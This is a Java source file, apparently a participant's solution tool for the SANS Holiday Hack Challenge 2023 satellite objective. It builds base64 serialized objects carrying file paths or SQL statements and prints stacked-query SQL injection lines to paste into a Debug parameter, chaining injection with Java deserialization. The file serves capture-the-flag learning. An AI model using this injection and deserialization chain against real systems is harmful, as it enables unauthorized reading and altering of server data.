/*
*
* ZenithSGS Satellite Diversion Objective from SANS Holiday Hack Challenge 2023
* Nick DeBaggis (pahtzo) - 20231223
*
* A basic Java object deserialize/serialize app for decoding/encoding the deserialization exploit object
* to leverage the vulnerabilities found in the SatelliteQueryFileFolderUtility class.
*
* Usage:
* java -jar ZenithSGS.jar -d "<base64 encoded serialized object to decode>"
* java -jar ZenithSGS.jar -sf "<file or directory to list on server>"
* java -jar ZenithSGS.jar -sq "<SQL query to run on server>"
* java -jar ZenithSGS.jar -su "<SQL update query to run on server>"
*
*/

import java.io.*;
import java.util.Base64;


public class ZenithSGS {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        int argslen = args.length;
        if(argslen == 2){
            switch (args[0]) {
                case "-d":
                    String objectb64 = args[1];
                    deserializecmd(objectb64);
                    break;
                case "-sf": {
                    String cmdtoserialize = args[1];
                    serializecmd(cmdtoserialize, false, false);
                    break;
                }
                case "-sq": {
                    String cmdtoserialize = args[1];
                    serializecmd(cmdtoserialize, true, false);
                    break;
                }
                case "-su": {
                    String cmdtoserialize = args[1];
                    serializecmd(cmdtoserialize, true, true);
                    break;
                }
                default:
                    printusage();
                    break;
            }
        }
        else{
            printusage();
        }
    }

    public  static void printusage(){
        String usage;
        usage = "ZenithSGS Satellite Diversion Objective from SANS Holiday Hack Challenge 2023\n" +
                "Nick DeBaggis (pahtzo) - 20231223\n\n" +
                "A basic Java object deserialize/serialize app for decoding/encoding the deserialization exploit object\n" +
                "to leverage the vulnerabilities found in the SatelliteQueryFileFolderUtility class.\n\n" +
                "Usage:\n" +
                "java -jar ZenithSGS.jar -d \"<base64 encoded serialized object to decode>\"\n" +
                "java -jar ZenithSGS.jar -sf \"<file or directory to list on server>\"\n" +
                "java -jar ZenithSGS.jar -sq \"<SQL query to run on server>\"\n" +
                "java -jar ZenithSGS.jar -su \"<SQL update query to run on server>\"";
        System.out.println(usage);
    }
    public static void deserializecmd(String cmd) throws IOException, ClassNotFoundException {
        byte[] decoded = Base64.getDecoder().decode(cmd);
        ByteArrayInputStream bstream = new ByteArrayInputStream(decoded);
        ObjectInputStream ostream = new ObjectInputStream(bstream);
        SatelliteQueryFileFolderUtility deserializedObject = (SatelliteQueryFileFolderUtility) ostream.readObject();
        System.out.println("Deserialized object (base64 decoded):\n" + deserializedObject.getpathOrStatement());
    }
    public static void serializecmd(String cmd, boolean isQuery, boolean isUpdate) throws IOException {
        SatelliteQueryFileFolderUtility cmdobj = new SatelliteQueryFileFolderUtility(cmd, isQuery, isUpdate);
        ByteArrayOutputStream bstream = new ByteArrayOutputStream();
        ObjectOutputStream ostream = new ObjectOutputStream(bstream);
        ostream.writeObject(cmdobj);
        ostream.close();
        String b64obj = Base64.getEncoder().encodeToString(bstream.toByteArray());
        System.out.println("Object to serialize:\n" + cmd + " " + isQuery + " " + isUpdate);
        System.out.println("Serialized object (base64 encoded):\n" + b64obj);
        System.out.println("\nPaste the following lines, in order, with each as a separate submit, into the missile-targeting-system Action service Debug action parameter:");
        System.out.println(";INSERT satellite_query SET object=FROM_BASE64('" + b64obj + "');");
        System.out.println(";SELECT * FROM satellite_query WHERE jid=(SELECT MAX(jid) FROM satellite_query);\n");
        System.out.println("Click the missile-targeting-system Parameter service getValue for Debug or PointingMode to retrieve the results.");
        System.out.println("Note: some queries and file/directory listings may require a running packet capture prior to submitting in order to obtain all the output.");
    }
}

